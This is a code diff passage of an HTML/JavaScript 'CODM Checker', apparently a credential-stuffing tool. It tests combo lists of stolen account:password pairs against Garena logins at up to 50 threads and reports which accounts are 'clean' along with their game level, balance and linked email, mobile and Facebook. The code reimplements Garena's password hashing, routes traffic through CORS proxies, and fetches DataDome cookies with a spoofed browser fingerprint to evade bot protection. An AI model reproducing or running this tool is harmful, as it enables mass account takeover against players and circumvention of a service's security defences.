+            <div class="stat-card magenta"><div class="stat-label">No CODM</div><div class="stat-value" id="stat-nocodm">0</div></div>
+            <div class="stat-card green"><div class="stat-label">Clean</div><div class="stat-value" id="stat-clean">0</div></div>
+            <div class="stat-card yellow"><div class="stat-label">Not Clean</div><div class="stat-value" id="stat-notclean">0</div></div>
+            <div class="stat-card red"><div class="stat-label">Errors</div><div class="stat-value" id="stat-errors">0</div></div>
+            <div class="stat-card dim"><div class="stat-label">Processed</div><div class="stat-value" id="stat-processed">0</div></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">📈</span> Level Distribution</div></div>
+          <div class="stats-grid">
+            <div class="stat-card green"><div class="stat-label">Clean Lv 1-100</div><div class="stat-value" id="lvl-clean-1">0</div></div>
+            <div class="stat-card green"><div class="stat-label">Clean Lv 101-200</div><div class="stat-value" id="lvl-clean-2">0</div></div>
+            <div class="stat-card green"><div class="stat-label">Clean Lv 201-350</div><div class="stat-value" id="lvl-clean-3">0</div></div>
+            <div class="stat-card green"><div class="stat-label">Clean Lv 351-400</div><div class="stat-value" id="lvl-clean-4">0</div></div>
+            <div class="stat-card yellow"><div class="stat-label">NC Lv 1-100</div><div class="stat-value" id="lvl-nc-1">0</div></div>
+            <div class="stat-card yellow"><div class="stat-label">NC Lv 101-200</div><div class="stat-value" id="lvl-nc-2">0</div></div>
+            <div class="stat-card yellow"><div class="stat-label">NC Lv 201-350</div><div class="stat-value" id="lvl-nc-3">0</div></div>
+            <div class="stat-card yellow"><div class="stat-label">NC Lv 351-400</div><div class="stat-value" id="lvl-nc-4">0</div></div>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">🖥️</span> Quick Start</div></div>
+          <div style="font-size:13px;line-height:1.8;color:var(--text-muted)">
+            <p>1. Go to <strong style="color:var(--primary)">Settings</strong> and configure a CORS proxy (required for API calls).</p>
+            <p>2. Use <strong style="color:var(--primary)">Single Check</strong> to check one account, or <strong style="color:var(--primary)">Bulk Check</strong> to check a file.</p>
+            <p>3. View results in <strong style="color:var(--primary)">Results</strong> tab and export to TXT/CSV/JSON.</p>
+          </div>
+          <div class="alert alert-warning" style="margin-top:12px">
+            <span>⚠</span>
+            <div><strong>CORS Required:</strong> Browsers block direct requests to garena.com. You must set up a CORS proxy. See Settings for instructions.</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="content hidden" id="view-single">
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">🎯</span> Single Account Check</div></div>
+          <div class="form-row">
+            <div class="form-group">
+              <label class="form-label">Username / Email</label>
+              <input class="form-input" id="single-account" placeholder="username or email" autocomplete="off">
             </div>
-            <div class="status-item">
-                <span class="status-label">Proxy:</span>
-                <span class="status-value" id="proxyStatus">OFF</span>
+            <div class="form-group">
+              <label class="form-label">Password</label>
+              <input class="form-input" id="single-password" type="password" placeholder="password" autocomplete="off">
             </div>
-            <div class="status-item">
-                <span class="status-label">Accounts Checked:</span>
-                <span class="status-value" id="accountsChecked">0</span>
+          </div>
+          <div style="display:flex;gap:8px;align-items:center;margin-bottom:12px">
+            <label class="toggle"><input type="checkbox" id="single-save" checked><span class="toggle-slider"></span></label>
+            <span style="font-size:12px;color:var(--text-muted)">Save result to results list</span>
+          </div>
+          <button class="btn btn-primary" id="single-check-btn" onclick="Checker.singleCheck()">
+            ▶ Check Account
+          </button>
+        </div>
+        <div id="single-result-area"></div>
+      </div>
+
+      <div class="content hidden" id="view-bulk">
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">📂</span> Bulk Check</div></div>
+          <div class="tabs">
+            <div class="tab active" data-bulk-tab="paste">Paste Text</div>
+            <div class="tab" data-bulk-tab="upload">Upload File</div>
+          </div>
+          <div id="bulk-tab-paste">
+            <div class="form-group">
+              <label class="form-label">Combo List (one per line: account:password)</label>
+              <textarea class="form-textarea" id="bulk-textarea" placeholder="user1:pass1&#10;user2:pass2&#10;email3:pass3"></textarea>
             </div>
-            <div class="status-item">
-                <span class="status-label">Valid:</span>
-                <span class="status-value" id="validCount">0</span>
+          </div>
+          <div id="bulk-tab-upload" style="display:none">
+            <div class="file-drop" id="file-drop" onclick="document.getElementById('file-input').click()">
+              <div class="icon">📁</div>
+              <div class="text">Click or drag a .txt file here<br>Format: account:password per line</div>
             </div>
-            <div class="status-item">
-                <span class="status-label">CODM Found:</span>
-                <span class="status-value" id="codmCount">0</span>
+            <input type="file" id="file-input" accept=".txt" style="display:none">
+            <div id="file-info" style="margin-top:8px;font-size:12px;color:var(--text-muted)"></div>
+          </div>
+          <div class="form-row" style="margin-top:12px">
+            <div class="form-group">
+              <label class="form-label">Threads (1-50)</label>
+              <input class="form-input" id="bulk-threads" type="number" value="5" min="1" max="50">
             </div>
+            <div class="form-group">
+              <label class="form-label">Check Other Games</label>
+              <select class="form-select" id="bulk-other-games">
+                <option value="false">CODM Only</option>
+                <option value="true">All Games</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label class="form-label">Auto-remove checked</label>
+              <select class="form-select" id="bulk-auto-remove">
+                <option value="false">No</option>
+                <option value="true">Yes</option>
+              </select>
+            </div>
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn btn-primary" id="bulk-start-btn" onclick="Checker.bulkCheck()">▶ Start Bulk Check</button>
+            <button class="btn btn-danger" id="bulk-stop-btn" onclick="Checker.stopBulk()" disabled>■ Stop</button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title"><span class="icon">📊</span> Progress</div>
+            <span id="bulk-count" style="font-size:12px;color:var(--text-muted)">0 / 0</span>
+          </div>
+          <div class="progress-bar"><div class="progress-fill" id="bulk-progress" style="width:0%"></div></div>
+          <div class="progress-info">
+            <span id="bulk-progress-text">0%</span>
+            <span id="bulk-speed">0.0 acc/s</span>
+            <span id="bulk-eta">ETA: --</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="content hidden" id="view-validator">
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">✓</span> Validator (Login Only)</div></div>
+          <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px">Checks if credentials are valid without fetching game data. Faster than full check.</p>
+          <div class="tabs">
+            <div class="tab active" data-val-tab="paste">Paste Text</div>
+            <div class="tab" data-val-tab="upload">Upload File</div>
+          </div>
+          <div id="val-tab-paste">
+            <div class="form-group">
+              <label class="form-label">Combo List</label>
+              <textarea class="form-textarea" id="val-textarea" placeholder="user1:pass1&#10;user2:pass2"></textarea>
+            </div>
+          </div>
+          <div id="val-tab-upload" style="display:none">
+            <div class="file-drop" id="val-file-drop" onclick="document.getElementById('val-file-input').click()">
+              <div class="icon">📁</div>
+              <div class="text">Click or drag a .txt file here</div>
+            </div>
+            <input type="file" id="val-file-input" accept=".txt" style="display:none">
+            <div id="val-file-info" style="margin-top:8px;font-size:12px;color:var(--text-muted)"></div>
+          </div>
+          <div class="form-row" style="margin-top:12px">
+            <div class="form-group">
+              <label class="form-label">Threads</label>
+              <input class="form-input" id="val-threads" type="number" value="10" min="1" max="50">
+            </div>
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn btn-primary" id="val-start-btn" onclick="Checker.startValidator()">▶ Start Validation</button>
+            <button class="btn btn-danger" id="val-stop-btn" onclick="Checker.stopValidator()" disabled>■ Stop</button>
+          </div>
+        </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">📊</span> Validator Progress</div></div>
+          <div class="progress-bar"><div class="progress-fill" id="val-progress" style="width:0%"></div></div>
+          <div class="progress-info">
+            <span id="val-progress-text">0%</span>
+            <span id="val-count">0 / 0</span>
+            <span id="val-stats">V:0 I:0 E:0</span>
+          </div>
+        </div>
+      </div>
+
+      <div class="content hidden" id="view-results">
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title"><span class="icon">📋</span> Results (<span id="results-count">0</span>)</div>
+            <div style="display:flex;gap:8px">
+              <button class="btn btn-ghost btn-sm" onclick="Results.export('txt')">TXT</button>
+              <button class="btn btn-ghost btn-sm" onclick="Results.export('csv')">CSV</button>
+              <button class="btn btn-ghost btn-sm" onclick="Results.export('json')">JSON</button>
+              <button class="btn btn-danger btn-sm" onclick="Results.clear()">Clear</button>
+            </div>
+          </div>
+          <div class="filter-bar">
+            <select class="form-select" id="filter-type" onchange="Results.render()">
+              <option value="all">All Results</option>
+              <option value="clean">Clean Only</option>
+              <option value="notclean">Not Clean Only</option>
+              <option value="nocodm">No CODM Only</option>
+              <option value="invalid">Invalid Only</option>
+              <option value="error">Errors Only</option>
+            </select>
+            <input class="form-input" id="filter-search" placeholder="Search..." oninput="Results.render()">
+          </div>
+          <div style="overflow-x:auto;max-height:500px;overflow-y:auto">
+            <table class="results-table" id="results-table">
+              <thead>
+                <tr>
+                  <th>#</th><th>Account</th><th>Status</th><th>CODM</th>
+                  <th>Level</th><th>Region</th><th>Shell</th><th>Email</th><th>Mobile</th><th>FB</th>
+                </tr>
+              </thead>
+              <tbody id="results-tbody"></tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+
+      <div class="content hidden" id="view-settings">
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">⚙</span> CORS Proxy Configuration</div></div>
+          <div class="alert alert-warning">
+            <span>⚠</span>
+            <div>
+              <strong>Browsers block cross-origin requests to garena.com.</strong><br>
+              You need a CORS proxy that forwards cookies and headers. Options:<br>
+              <br>
+              <strong>Option 1 — Local cors-anywhere (recommended):</strong><br>
+              <code style="background:var(--bg);padding:2px 6px;border-radius:4px">npx cors-anywhere</code> then set proxy to <code style="background:var(--bg);padding:2px 6px;border-radius:4px">http://localhost:8080/</code><br>
+              <br>
+              <strong>Option 2 — Public proxy:</strong><br>
+              Use <code style="background:var(--bg);padding:2px 6px;border-radius:4px">https://corsproxy.io/?url=</code> (may not support cookies)<br>
+              <br>
+              <strong>Option 3 — Browser extension:</strong><br>
+              Install "CORS Unblock" extension and set proxy to empty (direct).
+            </div>
+          </div>
+          <div class="form-group">
+            <label class="form-label">CORS Proxy URL</label>
+            <input class="form-input" id="settings-proxy" placeholder="https://corsproxy.io/?url= or http://localhost:8080/" value="https://corsproxy.io/?url=">
+          </div>
+          <div style="display:flex;gap:8px">
+            <button class="btn btn-primary" onclick="Settings.save()">Save Settings</button>
+            <button class="btn btn-ghost" onclick="Settings.testProxy()">Test Connection</button>
+          </div>
+          <div id="proxy-test-result" style="margin-top:8px"></div>
         </div>
 
-        <!-- Main Grid -->
-        <div class="main-grid">
-            <!-- Left Panel - Controls -->
-            <div class="cyber-panel">
-                <div class="panel-title">
-                    <span class="accent">▸</span> CONTROL TERMINAL
-                </div>
-
-                <!-- Tabs -->
-                <div class="tab-container">
-                    <button class="tab-button active" data-tab="bulk">Bulk Check</button>
-                    <button class="tab-button" data-tab="single">Single Check</button>
-                </div>
-
-                <!-- Bulk Check Tab -->
-                <div class="tab-content active" id="tab-bulk">
-                    <div class="file-upload-area" id="fileUploadArea">
-                        <span class="upload-icon">📁</span>
-                        <div class="upload-text">
-                            <strong>Drop combo file here</strong> or click to browse<br>
-                            <span style="font-size: 0.8em; color: #555;">Supports .txt files</span>
-                        </div>
-                        <input type="file" id="fileInput" accept=".txt">
-                    </div>
-                    <div id="fileInfo" style="margin-top: 10px; display: none;">
-                        <span style="color: #00ffff;">File loaded:</span>
-                        <span id="fileName" style="color: #ff00ff;"></span>
-                        <span style="color: #888; margin-left: 15px;">Accounts:</span>
-                        <span id="fileAccounts" style="color: #00ffff;"></span>
-                    </div>
-
-                    <div class="options-grid" style="margin-top: 20px;">
-                        <div class="option-item">
-                            <span>Threads:</span>
-                            <input type="number" id="threadCount" value="5" min="1" max="50">
-                        </div>
-                        <div class="option-item">
-                            <input type="checkbox" id="autoRemove">
-                            <span>Auto-remove checked</span>
-                        </div>
-                        <div class="option-item">
-                            <input type="checkbox" id="checkGames">
-                            <span>Check other games</span>
-                        </div>
-                        <div class="option-item">
-                            <input type="checkbox" id="useProxy">
-                            <span>Use proxy</span>
-                        </div>
-                    </div>
-
-                    <button class="cyber-button" id="startBulkBtn">
-                        <span class="button-icon">▶</span> START BULK CHECK
-                    </button>
-                    <button class="cyber-button" id="stopBulkBtn" disabled style="margin-top: 10px; background: rgba(255,0,0,0.1); border-color: rgba(255,0,0,0.3);">
-                        <span class="button-icon">■</span> STOP
-                    </button>
-                </div>
-
-                <!-- Single Check Tab -->
-                <div class="tab-content" id="tab-single">
-                    <div style="margin-bottom: 15px;">
-                        <label style="color: #888; font-size: 0.85em;">Username/Email</label>
-                        <input type="text" class="cyber-input" id="singleAccount" placeholder="Enter username or email" style="margin-top: 5px;">
-                    </div>
-                    <div style="margin-bottom: 15px;">
-                        <label style="color: #888; font-size: 0.85em;">Password</label>
-                        <input type="password" class="cyber-input" id="singlePassword" placeholder="Enter password" style="margin-top: 5px;">
-                    </div>
-                    <button class="cyber-button" id="startSingleBtn">
-                        <span class="button-icon">▶</span> CHECK ACCOUNT
-                    </button>
-                </div>
-            </div>
-
-            <!-- Right Panel - Stats -->
-            <div class="cyber-panel">
-                <div class="panel-title">
-                    <span class="accent">▸</span> SCAN STATISTICS
-                </div>
-
-                <div class="stats-grid">
-                    <div class="stat-card valid">
-                        <span class="stat-value" id="statValid">0</span>
-                        <span class="stat-label">Valid</span>
-                    </div>
-                    <div class="stat-card invalid">
-                        <span class="stat-value" id="statInvalid">0</span>
-                        <span class="stat-label">Invalid</span>
-                    </div>
-                    <div class="stat-card clean">
-                        <span class="stat-value" id="statClean">0</span>
-                        <span class="stat-label">Clean</span>
-                    </div>
-                    <div class="stat-card codm">
-                        <span class="stat-value" id="statCODM">0</span>
-                        <span class="stat-label">CODM Found</span>
-                    </div>
-                    <div class="stat-card error">
-                        <span class="stat-value" id="statError">0</span>
-                        <span class="stat-label">Errors</span>
-                    </div>
-                    <div class="stat-card">
-                        <span class="stat-value" id="statRate">0</span>
-                        <span class="stat-label">Rate (acc/s)</span>
-                    </div>
-                </div>
-
-                <!-- Progress -->
-                <div class="progress-container" id="progressContainer">
-                    <div class="progress-bar">
-                        <div class="progress-fill" id="progressFill"></div>
-                    </div>
-                    <div class="progress-info">
-                        <span id="progressText">0 / 0</span>
-                        <span class="progress-percent" id="progressPercent">0%</span>
-                        <span id="progressETA">ETA: --:--</span>
-                    </div>
-                </div>
-
-                <!-- Log -->
-                <div style="margin-top: 15px;">
-                    <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 10px;">
-                        <span style="color: #888; font-size: 0.85em;">📋 LOG OUTPUT</span>
-                        <button id="clearLogBtn" style="background: none; border: none; color: #555; cursor: pointer; font-size: 0.8em;">Clear</button>
-                    </div>
-                    <div class="log-container" id="logContainer">
-                        <div class="log-entry">
-                            <span class="log-time">[SYSTEM]</span>
-                            <span class="log-info">Initialized cyberpunk checker v3.0</span>
-                        </div>
-                        <div class="log-entry">
-                            <span class="log-time">[SYSTEM]</span>
-                            <span class="log-info">Ready for operation... awaiting input</span>
-                        </div>
-                    </div>
-                </div>
-            </div>
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">🔐</span> DataDome Cookie</div></div>
+          <p style="font-size:12px;color:var(--text-muted);margin-bottom:12px">DataDome is Garena's bot protection. The checker fetches this automatically, but you can also paste a known-good cookie.</p>
+          <div class="form-group">
+            <label class="form-label">DataDome Cookie (optional)</label>
+            <input class="form-input" id="settings-datadome" placeholder="Leave empty for auto-fetch">
+          </div>
+          <button class="btn btn-ghost" onclick="Settings.fetchDatadome()">Fetch DataDome Cookie</button>
+          <div id="datadome-result" style="margin-top:8px"></div>
         </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">🍪</span> Session Cookies</div></div>
+          <div class="cookie-panel" id="cookie-panel">
+            <div class="cookie-item"><span class="ck-name">No cookies set</span></div>
+          </div>
+          <button class="btn btn-ghost btn-sm" style="margin-top:8px" onclick="HTTPClient.clearCookies()">Clear Cookies</button>
+        </div>
+
+        <div class="card">
+          <div class="card-header"><div class="card-title"><span class="icon">ℹ️</span> About</div></div>
+          <div style="font-size:12px;line-height:1.8;color:var(--text-muted)">
+            <p><strong style="color:var(--text)">NIXZ CODM Checker — Web Edition</strong></p>
+            <p>Telegram: @nixzlls | Owner: @nixzlls</p>
+            <br>
+            <p>Implements the full Garena authentication flow:</p>
+            <p>1. DataDome cookie fetch from dd.garena.com</p>
+            <p>2. Prelogin (get v1, v2 challenge values)</p>
+            <p>3. Login (MD5 → SHA-256 → AES-ECB password hash)</p>
+            <p>4. Account info retrieval from account.garena.com</p>
+            <p>5. CODM OAuth flow (grant → exchange → callback → user info)</p>
+            <br>
+            <p>All crypto is performed client-side. No data is sent to any server except Garena's APIs (through your CORS proxy).</p>
+          </div>
+        </div>
+      </div>
+
+      <!-- Terminal -->
+      <div class="terminal" id="terminal"></div>
     </div>
+  </div>
+</div>
 
-    <!-- Result Modal -->
-    <div class="result-modal" id="resultModal">
-        <div class="result-modal-content">
-            <button class="close-btn" id="closeModalBtn">✕</button>
-            <h2>📊 ACCOUNT DETAILS</h2>
-            <div id="modalContent"></div>
-        </div>
-    </div>
+<script>
+/* ═══════════════════════════════════════════════════════════════
+   CRYPTO MODULE — MD5, SHA-256, AES-ECB password hashing
+   ═══════════════════════════════════════════════════════════════ */
 
-    <script>
-        // ============================================================
-        // CYBERPUNK CODM CHECKER - Frontend Logic
-        // ============================================================
+const Crypto = {
+  md5(str) {
+    return CryptoJS.MD5(str).toString();
+  },
 
-        // --- State ---
-        const state = {
-            isRunning: false,
-            totalAccounts: 0,
-            processed: 0,
-            stats: {
-                valid: 0,
-                invalid: 0,
-                clean: 0,
-                codm: 0,
-                error: 0
-            },
-            startTime: null,
-            fileData: null,
-            accounts: [],
-            currentIndex: 0
-        };
+  async sha256(str) {
+    const encoder = new TextEncoder();
+    const data = encoder.encode(str);
+    const hashBuffer = await crypto.subtle.digest('SHA-256', data);
+    return Array.from(new Uint8Array(hashBuffer))
+      .map(b => b.toString(16).padStart(2, '0')).join('');
+  },
 
-        // --- DOM References ---
-        const $ = (id) => document.getElementById(id);
-        const statusDot = $('statusDot');
-        const systemStatus = $('systemStatus');
-        const proxyStatus = $('proxyStatus');
-        const accountsChecked = $('accountsChecked');
-        const validCount = $('validCount');
-        const codmCount = $('codmCount');
+  /* AES-ECB encrypt: key=outer_hash(32 bytes), plaintext=passmd5(16 bytes) */
+  encodeAES(plaintextHex, keyHex) {
+    const key = CryptoJS.enc.Hex.parse(keyHex);
+    const plaintext = CryptoJS.enc.Hex.parse(plaintextHex);
+    const encrypted = CryptoJS.AES.encrypt(plaintext, key, {
+      mode: CryptoJS.mode.ECB,
+      padding: CryptoJS.pad.NoPadding
+    });
+    return encrypted.ciphertext.toString(CryptoJS.enc.Hex).substring(0, 32);
+  },
 
-        const statValid = $('statValid');
-        const statInvalid = $('statInvalid');
-        const statClean = $('statClean');
-        const statCODM = $('statCODM');
-        const statError = $('statError');
-        const statRate = $('statRate');
+  /* Full password hash: MD5(pwd) → SHA256(md5+v1) → SHA256(inner+v2) → AES-ECB */
+  async hashPassword(password, v1, v2) {
+    const decoded = decodeURIComponent(password);
+    const passmd5 = this.md5(decoded);
+    const innerHash = await this.sha256(passmd5 + v1);
+    const outerHash = await this.sha256(innerHash + v2);
+    return this.encodeAES(passmd5, outerHash);
+  }
+};
 
-        const progressContainer = $('progressContainer');
-        const progressFill = $('progressFill');
-        const progressText = $('progressText');
-        const progressPercent = $('progressPercent');
-        const progressETA = $('progressETA');
+/* ═══════════════════════════════════════════════════════════════
+   HTTP CLIENT — fetch with CORS proxy + manual cookie management
+   ═══════════════════════════════════════════════════════════════ */
 
-        const logContainer = $('logContainer');
-        const fileInput = $('fileInput');
-        const fileUploadArea = $('fileUploadArea');
-        const fileInfo = $('fileInfo');
-        const fileName = $('fileName');
-        const fileAccounts = $('fileAccounts');
+const HTTPClient = {
+  proxyUrl: 'https://corsproxy.io/?url=',
+  cookies: {},
+  datadomeOverride: null,
 
-        const startBulkBtn = $('startBulkBtn');
-        const stopBulkBtn = $('stopBulkBtn');
-        const startSingleBtn = $('startSingleBtn');
-        const clearLogBtn = $('clearLogBtn');
+  init() {
+    const saved = localStorage.getItem('nixz_proxy');
+    if (saved) this.proxyUrl = saved;
+    const dd = localStorage.getItem('nixz_datadome');
+    if (dd) this.datadomeOverride = dd;
+  },
 
-        const singleAccount = $('singleAccount');
-        const singlePassword = $('singlePassword');
-        const threadCount = $('threadCount');
-        const autoRemove = $('autoRemove');
-        const checkGames = $('checkGames');
-        const useProxy = $('useProxy');
+  buildUrl(url) {
+    if (!this.proxyUrl) return url;
+    if (this.proxyUrl.includes('?url=')) {
+      return this.proxyUrl + encodeURIComponent(url);
+    }
+    return this.proxyUrl + url;
+  },
 
-        const resultModal = $('resultModal');
-        const modalContent = $('modalContent');
-        const closeModalBtn = $('closeModalBtn');
+  setCookie(name, value, domain = 'garena') {
+    if (!this.cookies[domain]) this.cookies[domain] = {};
+    this.cookies[domain][name] = value;
+  },
 
-        // --- Tab System ---
-        document.querySelectorAll('.tab-button').forEach(btn => {
-            btn.addEventListener('click', function() {
-                document.querySelectorAll('.tab-button').forEach(b => b.classList.remove('active'));
-                document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
-                this.classList.add('active');
-                document.getElementById('tab-' + this.dataset.tab).classList.add('active');
-            });
-        });
-
-        // --- File Upload ---
-        fileInput.addEventListener('change', function(e) {
-            if (this.files.length > 0) {
-                const file = this.files[0];
-                const reader = new FileReader();
-                reader.onload = function(e) {
-                    const content = e.target.result;
-                    const lines = content.split('\n').filter(line => line.trim() && line.includes(':'));
-                    state.accounts = lines.map(line => {
-                        const [acc, pwd] = line.split(':').map(s => s.trim());
-                        return { account: acc, password: pwd };
-                    }).filter(a => a.account && a.password);
-                    
-                    state.totalAccounts = state.accounts.length;
-                    fileName.textContent = file.name;
-                    fileAccounts.textContent = state.totalAccounts;
-                    fileInfo.style.display = 'block';
-                    
-                    addLog('info', `Loaded ${state.totalAccounts} accounts from ${file.name}`);
-                };
-                reader.readAsText(file);
-            }
-        });
-
-        // Drag and drop
-        fileUploadArea.addEventListener('dragover', function(e) {
-            e.preventDefault();
-            this.classList.add('dragover');
-        });
-        fileUploadArea.addEventListener('dragleave', function(e) {
-            e.preventDefault();
-            this.classList.remove('dragover');
-        });
-        fileUploadArea.addEventListener('drop', function(e) {
-            e.preventDefault();
-            this.classList.remove('dragover');
-            if (e.dataTransfer.files.length > 0) {
-                fileInput.files = e.dataTransfer.files;
-                fileInput.dispatchEvent(new Event('change'));
-            }
-        });
-
-        // --- Logging ---
-        function addLog(type, message) {
-            const time = new Date().toLocaleTimeString();
-            const entry = document.createElement('div');
-            entry.className = 'log-entry';
-            const colorMap = {
-                'valid': 'log-valid',
-                'invalid': 'log-invalid',
-                'clean': 'log-clean',
-                'codm': 'log-codm',
-                'error': 'log-error',
-                'info': 'log-info'
-            };
-            entry.innerHTML = `
-                <span class="log-time">[${time}]</span>
-                <span class="${colorMap[type] || 'log-info'}">${message}</span>
-            `;
-            logContainer.appendChild(entry);
-            logContainer.scrollTop = logContainer.scrollHeight;
+  getCookies(domains = ['garena']) {
+    const parts = [];
+    const seen = new Set();
+    for (const d of domains) {
+      if (this.cookies[d]) {
+        for (const [name, value] of Object.entries(this.cookies[d])) {
+          if (!seen.has(name)) {
+            parts.push(`${name}=${value}`);
+            seen.add(name);
+          }
         }
+      }
+    }
+    return parts.join('; ');
+  },
 
-        clearLogBtn.addEventListener('click', function() {
-            logContainer.innerHTML = '';
-            addLog('info', 'Log cleared');
-        });
+  clearCookies() {
+    this.cookies = {};
+    UI.renderCookies();
+    UI.log('Cookies cleared', 'info');
+  },
 
-        // --- Stats Update ---
-        function updateStats() {
-            const s = state.stats;
-            const processed = state.processed;
-            
-            statValid.textContent = s.valid;
-            statInvalid.textContent = s.invalid;
-            statClean.textContent = s.clean;
-            statCODM.textContent = s.codm;
-            statError.textContent = s.error;
-            
-            accountsChecked.textContent = processed;
-            validCount.textContent = s.valid;
-            codmCount.textContent = s.codm;
-
-            // Rate
-            if (state.startTime && processed > 0) {
-                const elapsed = (Date.now() - state.startTime) / 1000;
-                const rate = processed / elapsed;
-                statRate.textContent = rate.toFixed(1);
-            }
-
-            // Progress
-            if (state.totalAccounts > 0) {
-                const pct = (processed / state.totalAccounts) * 100;
-                progressFill.style.width = Math.min(pct, 100) + '%';
-                progressText.textContent = `${processed} / ${state.totalAccounts}`;
-                progressPercent.textContent = `${pct.toFixed(1)}%`;
-                
-                if (state.startTime && processed > 0) {
-                    const elapsed = (Date.now() - state.startTime) / 1000;
-                    const rate = processed / elapsed;
-                    const remaining = state.totalAccounts - processed;
-                    const eta = remaining / rate;
-                    if (isFinite(eta)) {
-                        const mins = Math.floor(eta / 60);
-                        const secs = Math.floor(eta % 60);
-                        progressETA.textContent = `ETA: ${String(mins).padStart(2, '0')}:${String(secs).padStart(2, '0')}`;
-                    }
-                }
-            }
+  parseSetCookie(setCookieStr) {
+    if (!setCookieStr) return;
+    const cookies = setCookieStr.split(/,(?=\s*\w+=)/);
+    for (const c of cookies) {
+      const m = c.match(/^\s*([^=;]+)=([^;]+)/);
+      if (m) {
+        const name = m[1].trim();
+        const value = m[2].trim();
+        if (name && value) {
+          this.setCookie(name, value, 'garena');
+          if (name === 'datadome') {
+            UI.log(`DataDome cookie updated: ${value.substring(0, 20)}...`, 'info');
+          }
         }
+      }
+    }
+  },
 
-        // --- Show Result Modal ---
-        function showResult(data) {
-            let html = '';
-            const fields = [
-                ['Account', data.account || 'N/A'],
-                ['Password', data.password || 'N/A'],
-                ['UID', data.uid || 'N/A'],
-                ['Username', data.username || 'N/A'],
-                ['Nickname', data.nickname || 'N/A'],
-                ['Email', data.email_display || 'N/A'],
-                ['Mobile', data.formatted_mobile || 'N/A'],
-                ['Country', data.country || 'N/A'],
-                ['Shell Balance', data.shell_balance || 0],
-                ['CODM Level', data.codm_level || 'N/A'],
-                ['CODM Region', data.codm_region || 'N/A'],
-                ['CODM IGN', data.codm_nickname || 'N/A'],
-                ['Facebook', data.fb_info || 'N/A'],
-                ['Status', data.is_clean ? '✅ CLEAN' : '⚠️ NOT CLEAN'],
-                ['Has CODM', data.has_codm ? '✅ YES' : '❌ NO']
-            ];
-            fields.forEach(([label, value]) => {
-                const color = label.includes('CODM') ? '#00ffff' : 
-                             label === 'Status' && value.includes('CLEAN') ? '#00ff88' :
-                             label === 'Has CODM' && value.includes('YES') ? '#00ff88' : '#fff';
-                html += `<div class="result-field">
-                    <span class="label">${label}</span>
-                    <span class="value" style="color: ${color}">${value}</span>
-                </div>`;
-            });
-            modalContent.innerHTML = html;
-            resultModal.classList.add('active');
+  async request(url, options = {}) {
+    const fullUrl = this.buildUrl(url);
+    const cookieDomains = ['garena'];
+    const cookieString = this.getCookies(cookieDomains);
+
+    const headers = { ...options.headers };
+    if (cookieString) {
+      // Cookie is a forbidden header in fetch — use custom header for proxy
+      headers['X-Proxy-Cookie'] = cookieString;
+      // Also try setting Cookie directly (some proxies may forward it)
+      try { headers['Cookie'] = cookieString; } catch(e) {}
+    }
+
+    const fetchOpts = {
+      method: options.method || 'GET',
+      headers,
+      redirect: options.redirect || 'follow',
+    };
+
+    if (options.body) fetchOpts.body = options.body;
+    if (options.params) {
+      const u = new URL(url);
+      for (const [k, v] of Object.entries(options.params)) {
+        u.searchParams.set(k, v);
+      }
+      url = u.toString();
+    }
+
+    const finalUrl = this.buildUrl(url);
+
+    const response = await fetch(finalUrl, fetchOpts);
+
+    // Try to extract set-cookie
+    try {
+      const sc = response.headers.get('set-cookie');
+      if (sc) this.parseSetCookie(sc);
+    } catch(e) {}
+
+    // Also check x-set-cookie or x-cookies (some proxies use these)
+    try {
+      const xsc = response.headers.get('x-set-cookie') || response.headers.get('x-cookies');
+      if (xsc) this.parseSetCookie(xsc);
+    } catch(e) {}
+
+    return response;
+  },
+
+  async getJson(url, options = {}) {
+    const resp = await this.request(url, options);
+    const text = await resp.text();
+    try {
+      return { status: resp.status, json: JSON.parse(text), headers: resp.headers, text };
+    } catch(e) {
+      return { status: resp.status, json: null, headers: resp.headers, text };
+    }
+  }
+};
+
+/* ═══════════════════════════════════════════════════════════════
+   GARENA API — DataDome, Prelogin, Login, Account Info
+   ═══════════════════════════════════════════════════════════════ */
+
+const GarenaAPI = {
+  DATADOME_DDK: 'AE3F04AD3F0D3A462481A337485081',
+  DATADOME_CID: 'KOWn3t9QNk3dJJJEkpZJpspfb2HPZIVs0KSR7RYTscx5iO7o84cw95j40zFFG7mpfbKxmfhAOs~bM8Lr8cHia2JZ3Cq2LAn5k6XAKkONfSSad99Wu36EhKYyODGCZwae',
+
+  async fetchDatadome() {
+    UI.log('Fetching DataDome cookie...', 'info');
+    const url = 'https://dd.garena.com/js/';
+    
+    const jsData = JSON.stringify({
+      ttst: 76.7, ifov: false, hc: 4, br_oh: 824, br_ow: 1536,
+      ua: navigator.userAgent,
+      wbd: false, dp0: true, tagpu: 5.73, wdif: false, wdifrm: false,
+      npmtm: false, br_h: 738, br_w: 260, isf: false, nddc: 1, rs_h: 864,
+      rs_w: 1536, rs_cd: 24, phe: false, nm: false, jsf: false, lg: "en-US",
+      "pr ": 1.25, ars_h: 824, ars_w: 1536, tz: -480, str_ss: true, str_ls: true,
+      str_idb: true, str_odb: false, plgod: false, plg: 5, plgne: true, plgre: true,
+      plgof: false, plggt: false, pltod: false, hcovdr: false, hcovdr2: false,
+      plovdr: false, plovdr2: false, ftsovdr: false, ftsovdr2: false, lb: false,
+      eva: 33, lo: false, ts_mtp: 0, ts_tec: false, ts_tsa: false, vnd: "Google Inc.",
